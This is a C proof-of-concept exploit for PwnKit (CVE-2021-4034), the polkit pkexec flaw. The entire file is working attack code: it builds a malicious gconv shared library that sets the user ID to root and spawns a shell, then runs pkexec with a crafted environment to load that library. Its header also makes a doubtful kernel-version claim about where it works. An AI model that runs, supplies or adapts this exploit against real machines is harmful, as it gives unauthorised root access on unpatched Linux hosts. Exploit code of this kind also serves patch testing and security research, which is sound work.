/*
 * PwnKit (CVE-2021-4034) – arthepsy PoC
 * Works on CentOS 7 with kernel < 5.18
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell =
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <unistd.h>\n\n"
    "void gconv() {}\n"
    "void gconv_init() {\n"
    "  setuid(0); setgid(0);\n"
    "  seteuid(0); setegid(0);\n"
    "  system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin;\"\n"
    "         \"rm -rf 'GCONV_PATH=.' pwnkit; /bin/sh -p\");\n"
    "  exit(0);\n"
    "}\n";

int main(int argc, char *argv[])
{
    FILE *fp;

    system("mkdir -p 'GCONV_PATH=.' pwnkit");
    system("touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
    system("echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");

    fp = fopen("pwnkit/pwnkit.c", "w");
    if (!fp) { perror("fopen"); return 1; }
    fprintf(fp, "%s", shell);
    fclose(fp);

    if (system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC") != 0) {
        fprintf(stderr, "[-] gcc failed — install gcc: sudo yum install -y gcc\n");
        return 1;
    }

    char *env[] = {
        "pwnkit",
        "PATH=GCONV_PATH=.",
        "CHARSET=PWNKIT",
        "SHELL=pwnkit",
        NULL
    };
    execve("/usr/bin/pkexec", (char *[]){ NULL }, env);
    perror("execve");
    return 1;
}
